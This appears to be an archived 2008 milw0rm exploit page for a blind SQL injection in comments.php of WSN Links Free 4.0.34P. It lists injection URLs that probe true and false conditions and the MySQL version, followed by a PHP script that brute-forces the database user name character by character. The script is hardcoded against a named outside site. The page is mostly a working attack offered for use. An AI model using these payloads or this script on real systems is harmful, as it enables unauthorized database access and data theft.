<html><head><title>WSN Links Free 4.0.34P (comments.php) Blind SQL Injection Exploit</title></head><pre>[-]Powered by WSN Links Free 4.0.34P Blind SQL Injection
 
By Stack

exploit:
http://site.com/path/comments.php?id=1 and 2&gt;1/*   #the page fully loaded
http://site.com/path/comments.php?id=1 and 1&gt;3/*   #page loaded whit any data and some error that say
 &quot;No such content exists. The link you are following seems to have been incorrect.&quot;
cheking the mysql version:
http://site.com/path/comments.php?id=1%20and%20substring(@@version,1,1)=5
or
http://site.com/path/comments.php?id=1%20and%20substring(@@version,1,1)=4
# you can exploting the bug white blind sql automatic toolz such as sqlmap or ...
simple exploit to get user()
&lt;?php
function stringtohex($string){
 $hex = '';
 for($i=0 ; $i&lt;strlen($string) ; $i++) $hex .= base_convert(ord(substr($string, $i, 1)), 10, 16);
 return '0x'.$hex;
}
echo &quot;=================================================\n&quot;;
echo &quot;   WSN Links Free 4.0.34P Blind SQL Injection    \n&quot;;
echo &quot;             by Stack &amp; bugtr4cker               \n&quot;;
echo &quot;        usage:      php $argv[0]               \n&quot;;
echo &quot;=================================================\n&quot;;
echo &quot;\n[!] UserID : &quot;;
$id = intval(fgets(STDIN));
$url = &quot;http://www.ossoba.com/wlinks/comments.php?id=$id&quot;; # change http://localhost/wlinks/ by your vulnerable site
$regexp = 'Your Name:';
$login_len = 0;
$password_len = 0;
$login = '';
$password = '';
$alphabet_Stack =  array(&quot;a&quot; , &quot;b&quot; , &quot;c&quot; , &quot;d&quot; , &quot;e&quot; , &quot;f&quot; , &quot;g&quot; , &quot;h&quot; , &quot;i&quot; , &quot;j&quot; , &quot;k&quot; , &quot;l&quot; , &quot;m&quot; , &quot;n&quot; , &quot;o&quot; , &quot;p&quot; , &quot;q&quot; , &quot;r&quot; , &quot;s&quot; , &quot;t&quot; , &quot;u&quot; , &quot;v&quot; , &quot;w&quot; , &quot;x&quot; , &quot;y&quot; , &quot;z&quot; , &quot;0&quot; , &quot;1&quot; , &quot;2&quot; , &quot;3&quot; , &quot;4&quot; , &quot;5&quot; , &quot;6&quot; , &quot;7&quot; , &quot;8&quot; , &quot;9&quot;, &quot;@&quot;, &quot;:&quot;, &quot;&lt;&quot;, &quot;&gt;&quot; ,'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','.','*','%','Ã©','&amp;' );
echo &quot;\n[+] BF Longeur User : &quot;;
$stop = false ;
while($stop == false){
 $lenregexp = stringtohex('^.{'.$login_len.'}$');
 $xurl = $url.&quot;+AND+(SELECT+user())+REGEXP+$lenregexp/**&quot; ;
 $rep = file_get_contents($xurl);
 if(preg_match(&quot;#$regexp#&quot;,$rep)){
  echo $login_len ;
  $stop = true ;
 }
 if($stop == false) $login_len++ ;
}
echo &quot;\n[+] BF du User : &quot;;
for($i=0; $i&lt;= $login_len; $i++){
 $ok = false ; 
 foreach($alphabet_Stack as $Stackl){
  if($ok == true) continue ;
  $like = stringtohex($login.$Stackl);
  $urlx = $url.&quot;+AND+(SELECT+user())+LIKE+concat($like,0x25)/*&quot;;
  $rep = file_get_contents($urlx) ;
 
  if(preg_match(&quot;#$regexp#&quot;,$rep)){
   echo $Stackl ;
   $login .= $Stackl ;
   $ok = true ;
  }
 }
}
echo &quot;\n\n[+] Injection Completed \n&quot;;
echo &quot;\t User : $login\n\t&quot;;
?&gt;

# milw0rm.com [2008-09-22]</pre></html>